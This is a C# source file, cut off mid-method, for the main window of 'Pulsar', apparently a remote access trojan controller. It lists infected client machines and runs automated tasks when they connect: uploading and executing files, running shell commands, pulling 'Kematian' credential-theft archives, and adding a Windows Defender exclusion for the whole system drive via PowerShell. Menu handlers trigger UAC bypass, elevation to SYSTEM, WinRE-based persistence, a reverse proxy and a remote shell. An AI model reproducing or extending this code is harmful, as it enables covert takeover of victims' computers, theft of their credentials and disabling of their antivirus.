using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Messages.FunStuff.GDI;
using Pulsar.Common.Messages.Preview;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Messages.UserSupport.Website;
using Pulsar.Server.Extensions;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using Pulsar.Common.Messages.QuickCommands;
using System.IO;
using Newtonsoft.Json;
using System.Drawing;
using Pulsar.Common.Messages.Monitoring.VirtualMonitor;

using Pulsar.Common.Messages.ClientManagement.UAC;
using Pulsar.Common.Messages.ClientManagement.WinRE;

namespace Pulsar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public PulsarServer ListenServer { get; set; }
        private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC

        private const int STATUS_ID = 5;
        private const int CURRENTWINDOW_ID = 6;
        private const int USERSTATUS_ID = 7;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly ClientDebugLog _clientDebugLogHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        private PreviewHandler _previewImageHandler;
        private static readonly string PulsarStuffDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff");
        private readonly string AutoTasksFilePath = Path.Combine(PulsarStuffDir, "autotasks.json");

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _clientDebugLogHandler = new ClientDebugLog();
            RegisterMessageHandler();
            InitializeComponent();
            typeof(ListView).InvokeMember("DoubleBuffered",
                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
                null, this.lstClients, new object[] { true });
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
            _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
            _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup

            tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;
        }

        private void OnAddressReceived(object sender, Client client, string addressType)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnAddressReceived(sender, client, addressType)));
                return;
            }
        }

        private void OnLogReceived(object sender, Client client, string log)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
                return;
            }
        }        
        
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientDebugLogHandler);
            _clientDebugLogHandler.DebugLogReceived += OnLogReceived;
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
            _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
        }        
        
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientDebugLogHandler);
            _clientDebugLogHandler.DebugLogReceived -= OnLogReceived;
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
            _clientStatusHandler.UserClipboardStatusUpdated -= SetUserClipboardByClient;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Pulsar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Pulsar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            ListenServer = new PulsarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        public void EventLogVisability()
        {
            if (Settings.EventLog)
            {
                DebugLogRichBox.Visible = true;
                splitter1.Visible = true;
            }
            else
            {
                DebugLogRichBox.Visible = false;
                splitter1.Visible = false;
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            EventLog("Welcome to Pulsar.", "info");
            InitializeServer();
            AutostartListening();
            EventLogVisability();
            notifyIcon.Visible = false;
            Favorites.LoadFavorites();

            lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;

            LoadAutoTasks();
        }

        private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            if (e.ColumnIndex != hAccountType.Index)
            {
                lstClients.StretchColumnByIndex(hAccountType.Index);
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            SaveAutoTasks();

            ListenServer.Disconnect();
            UnregisterMessageHandler();
            if (_previewImageHandler != null)
            {
                MessageHandler.Unregister(_previewImageHandler);
                _previewImageHandler.Dispose();
            }
            _discordRpc.Enabled = false;  // Disable Discord RPC on close
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        public void EventLog(string message, string level)
        {
            try
            {
                if (DebugLogRichBox.InvokeRequired)
                {
                    DebugLogRichBox.Invoke(new Action(() => LogMessage(message, level)));
                }
                else
                {
                    LogMessage(message, level);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in EventLog: {ex.Message}");
            }
        }

        private void LogMessage(string message, string level)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                string formattedMessage = $"[{timestamp}] {message}";
                Color logColor = Color.DodgerBlue;

                switch (level.ToLower())
                {
                    case "normal":
                        if (Settings.DarkMode)
                            logColor = Color.White;
                        else
                            logColor = Color.Black;
                        break;

                    case "info":
                        logColor = Color.DodgerBlue;
                        break;

                    case "error":
                        logColor = Color.Red;
                        break;

                    default:
                        logColor = Color.DodgerBlue;
                        break;
                }

                int originalSelectionStart = DebugLogRichBox.SelectionStart;
                Color originalSelectionColor = DebugLogRichBox.SelectionColor;

                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;

                DebugLogRichBox.SelectionColor = logColor;

                DebugLogRichBox.AppendText(formattedMessage + Environment.NewLine);
                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;
                DebugLogRichBox.ScrollToCaret();
                
                DebugLogRichBox.SelectionStart = originalSelectionStart;
                DebugLogRichBox.SelectionColor = originalSelectionColor;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in LogMessage: {ex.Message}");
            }
        }

        private void TableLayoutPanel1_VisibleChanged(object sender, EventArgs e)
        {
            AdjustClientListViewSize();
        }

        private void AdjustClientListViewSize()
        {
            if (tableLayoutPanel1.Visible)
            {
                // Adjust the size of lstClients when tableLayoutPanel1 is visible
                lstClients.Width = this.ClientSize.Width - tableLayoutPanel1.Width;
            }
            else
            {
                // Adjust the size of lstClients when tableLayoutPanel1 is hidden
                lstClients.Width = this.ClientSize.Width;
            }
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();

            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 1)
            {
                if (_previewImageHandler != null)
                {
                    MessageHandler.Unregister(_previewImageHandler);
                    _previewImageHandler.Dispose();
                }

                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                MessageHandler.Register(_previewImageHandler);

                if (!chkDisablePreview.Checked)
                {
                    selectedClients[0].Send(new GetPreviewImage
                    {
                        Quality = 20,
                        DisplayIndex = 0
                    });
                }
            }
            else if (selectedClients.Length == 0)
            {
                pictureBoxMain.Image = Properties.Resources.no_previewbmp;
                clientInfoListView.Items.Clear();

                var defaultStats = new (string Label, string Value)[]
                {
                    ("CPU", "N/A"),
                    ("GPU", "N/A"),
                    ("RAM", "0 GB"),
                    ("Uptime", "N/A"),
                    ("Antivirus", "N/A"),
                    ("Default Browser", "N/A"),
                    ("Ping", "N/A"),
                    ("Webcam", "N/A"),
                    ("AFK Time", "N/A")
                };

                foreach (var (label, value) in defaultStats)
                {
                    var item = new ListViewItem(label);
                    item.SubItems.Add(value);
                    clientInfoListView.Items.Add(item);
                }
            }
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private bool IsClientBlocked(string clientAddress)
        {
            string filePath = Path.Combine(PulsarStuffDir, "blocked.json");

            if (!Directory.Exists(PulsarStuffDir))
            {
                Directory.CreateDirectory(PulsarStuffDir);
            }

            if (!(File.Exists(filePath)))
            {
                return false;
            }

            try
            {
                string json = File.ReadAllText(filePath);
                var blockedIPs = JsonConvert.DeserializeObject<List<string>>(json);
                return blockedIPs.Contains(clientAddress.ToString());
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void ClientConnected(Client client)
        {
            if (IsClientBlocked(client.EndPoint.Address.ToString()))
            {
                client.Send(new DoClientUninstall());
                EventLog("Blocked IP Attempted to connect " + client.EndPoint.Address, "error");
            }
            else
            {
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening) return;
                    _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
                }

                lock (_processingClientConnectionsLock)
                {
                    if (!_processingClientConnections)
                    {
                        _processingClientConnections = true;
                        ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                    }
                }
                UpdateConnectedClientsCount();
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private void UpdateConnectedClientsCount()
        {
            this.Invoke((MethodInvoker)delegate
            {
                connectedToolStripStatusLabel.Text = $"Connected: {ListenServer.ConnectedClients.Length}";
            });
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        RefreshStarButtons();
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            StartAutomatedTask(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;

                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        private void StartAutomatedTask(Client client)
        {
            Debug.WriteLine(IsClientBlocked(client.EndPoint.Address.ToString()) ? "Blocked client, skipping automated tasks." : "Starting automated tasks for client.");

            if (lstTasks.InvokeRequired)
            {
                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
                return;
            }

            foreach (ListViewItem item in lstTasks.Items)
            {
                string taskCaption = item.Text;
                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";

                switch (taskCaption)
                {
                    case "Remote Execute":
                        Debug.WriteLine("Remote Execute auto task starting");
                        var taskHandler = new TaskManagerHandler(client);

                        string remotePath = subItem0;
                        Debug.WriteLine($"Starting upload of {remotePath}");

                        var fileHandler = new FileManagerHandler(client);
                        fileHandler.BeginUploadFile(remotePath, "");

                        Debug.WriteLine($"Executing remote file: {remotePath}");
                        taskHandler.StartProcess(remotePath);
                        break;

                    case "Shell Command":
                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
                        break;

                    case "Kematian Recovery":
                        new KematianHandler(client).RequestKematianZip();
                        break;

                    case "Exclude System Drives":
                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                        {
                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                        }
                        break;

                    case "Message Box":
                        client.Send(new DoShowMessageBox
                        {
                            Caption = subItem0,
                            Text = subItem1,
                            Button = "OK",
                            Icon = "None"
                        });
                        break;
                    case "WinRE":
                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                        {
                            client.Send(new DoAddWinREPersistence());
                        }
                        break;
                    default:
                        break;
                }
            }
        }

        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RefreshStarButtons()
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem item in lstClients.Items)
                        {
                            if (item.Tag is Client client)
                            {
                                bool found = false;
                                foreach (Control control in lstClients.Controls)
                                {
                                    if (control is Button button && button.Tag is Client buttonClient && buttonClient.Equals(client))
                                    {
                                        found = true;
                                        break;
                                    }
                                }

                                if (!found)
                                {
                                    AddStarButton(item, client);
                                }
                            }
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void AddStarButton(ListViewItem item, Client client)
        {
            var starButton = new Button
            {
                Size = new System.Drawing.Size(20, 20),
                FlatStyle = FlatStyle.Flat,
                Tag = client,
                BackColor = Color.Transparent,
                FlatAppearance = { BorderSize = 0 },
                Cursor = Cursors.Hand
            };

            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                Properties.Resources.star_filled : Properties.Resources.star_empty;

            starButton.Click += StarButton_Click;

            lstClients.Controls.Add(starButton);

            UpdateStarButtonPosition(starButton, item);
            starButton.BringToFront();
        }

        private void UpdateStarButtonPosition(Control starControl, ListViewItem item)
        {
            if (item == null || starControl == null) return;

            var bounds = item.Bounds;
            int rightMargin = 23;

            if (lstClients.Items.Count > lstClients.ClientSize.Height / lstClients.GetItemRect(0).Height)
            {
                rightMargin += SystemInformation.VerticalScrollBarWidth;
            }

            starControl.Location = new Point(lstClients.Width - rightMargin, bounds.Top + (bounds.Height - starControl.Height) / 2);
        }

        private void StarButton_Click(object sender, EventArgs e)
        {
            if (sender is Control starControl && starControl.Tag is Client client)
            {
                Favorites.ToggleFavorite(client.Value.UserAtPc);

                if (starControl is Button button)
                {
                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                        Properties.Resources.star_filled : Properties.Resources.star_empty;
                }

                SortClientsByFavoriteStatus();
            }
        }

        private void SortClientsByFavoriteStatus()
        {
            lstClients.BeginUpdate();

            // Remove all star buttons first
            var controlsToRemove = lstClients.Controls.Cast<Control>()
                .Where(c => c is Button && c.Tag is Client)
                .ToList();

            foreach (var control in controlsToRemove)
            {
                lstClients.Controls.Remove(control);
            }

            // Separate favorited and unfavorited clients
            List<ListViewItem> favoritedItems = new List<ListViewItem>();
            List<ListViewItem> unfavoritedItems = new List<ListViewItem>();

            foreach (ListViewItem item in lstClients.Items)
            {
                if (item.Tag is Client client)
                {
                    if (Favorites.IsFavorite(client.Value.UserAtPc))
                        favoritedItems.Add(item);
                    else
                        unfavoritedItems.Add(item);
                }
            }

            // Clear the ListView
            lstClients.Items.Clear();

            // Add favorited items first, then unfavorited
            foreach (var item in favoritedItems)
                lstClients.Items.Add(item);

            foreach (var item in unfavoritedItems)
                lstClients.Items.Add(item);

            // Add star buttons back for each client in the correct order
            foreach (ListViewItem item in lstClients.Items)
            {
                if (item.Tag is Client client)
                {
                    AddStarButton(item, client);
                }
            }

            lstClients.EndUpdate();
        }

        private void AddClientToListview(Client client)
        {
            if (client == null) return;
            string nickname = GetClientNickname(client);

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, nickname, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                })

                { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                        AddStarButton(lvi, client);
                        SortClientsByFavoriteStatus();
                    }
                    //lvi.UseItemStyleForSubItems = false;
                    //lvi.SubItems[4].ForeColor = Color.Green;
                });
                EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private string GetClientNickname(Client client)
        {
            if (client?.Value?.Id == null)
                return string.Empty;

            string jsonFilePath = Path.Combine(PulsarStuffDir, "client_info.json");

            try
            {
                var clientInfos = LoadClientInfos(jsonFilePath);
                if (clientInfos != null && clientInfos.ContainsKey(client.Value.Id))
                {
                    return clientInfos[client.Value.Id]?.Nickname ?? string.Empty;
                }
                return string.Empty;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error loading client nickname: {ex.Message}");
                return string.Empty;
            }
        }

        private Dictionary<string, ClientInfo> LoadClientInfos(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                    return new Dictionary<string, ClientInfo>();

                string json = File.ReadAllText(filePath);

                if (string.IsNullOrWhiteSpace(json))
                    return new Dictionary<string, ClientInfo>();

                try
                {
                    var clientInfos = JsonConvert.DeserializeObject<Dictionary<string, ClientInfo>>(json);
                    return clientInfos ?? new Dictionary<string, ClientInfo>();
                }
                catch (JsonException)
                {
                    Debug.WriteLine("Failed to parse");
                }

                return new Dictionary<string, ClientInfo>();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error reading client info: {ex.Message}");
                return new Dictionary<string, ClientInfo>();
            }
        }

        private ClientInfo LoadClientInfo(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                    return null;

                string json = File.ReadAllText(filePath);

                if (string.IsNullOrWhiteSpace(json))
                    return null;

                ClientInfo clientInfo = JsonConvert.DeserializeObject<ClientInfo>(json);

                return clientInfo ?? null;
            }
            catch (Newtonsoft.Json.JsonException ex)
            {
                Debug.WriteLine($"JSON parsing error: {ex.Message}");
                return null;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error reading client info: {ex.Message}");
                return null;
            }
        }

        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            // Remove star button
                            var controlsToRemove = lstClients.Controls.Cast<Control>().Where(
                                c => c.Tag is Client buttonClient && buttonClient.Equals(client)).ToList();

                            foreach (var control in controlsToRemove)
                            {
                                lstClients.Controls.Remove(control);
                                control.Dispose();
                            }

                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
                EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[STATUS_ID].Text = text;
        }

        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
        }        
        
        private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
        }

        private void SetUserClipboardByClient(object sender, Client client, string clipboardText)
        {
            // looks clean
        }

        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.Visible = true;
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                    notifyIcon.Visible = false;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void elevateToSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoElevateSystem());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void deElevateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoDeElevate());
            }
        }

        private void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 0) return;

            var result = MessageBox.Show(
                $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
                "Confirm UAC Bypass",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning);

            if (result == DialogResult.Yes)
            {
                foreach (Client c in selectedClients)
                {
                    c.Send(new DoUACBypass());
                }
            }
        }

        private void installWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoAddWinREPersistence());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void removeWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoRemoveWinREPersistence());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void winRECustomFileForSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    FrmCustomFileStarter frmCustomFile = new FrmCustomFileStarter(c, typeof(AddCustomFileWinRE), false);
                    frmCustomFile.ShowDialog();
                    frmCustomFile.Focus();
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmNickname frmSi = new FrmNickname(c);
                frmSi.NicknameSaved += FrmSi_NicknameSaved;
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void FrmSi_NicknameSaved(object sender, EventArgs e)
        {
            if (sender is FrmNickname frmNickname)
            {
                UpdateClientNickname(frmNickname.GetClient());
            }
        }

        private void UpdateClientNickname(Client client)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[1].Text = GetClientNickname(client);
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients, true);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion "Client Management"

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
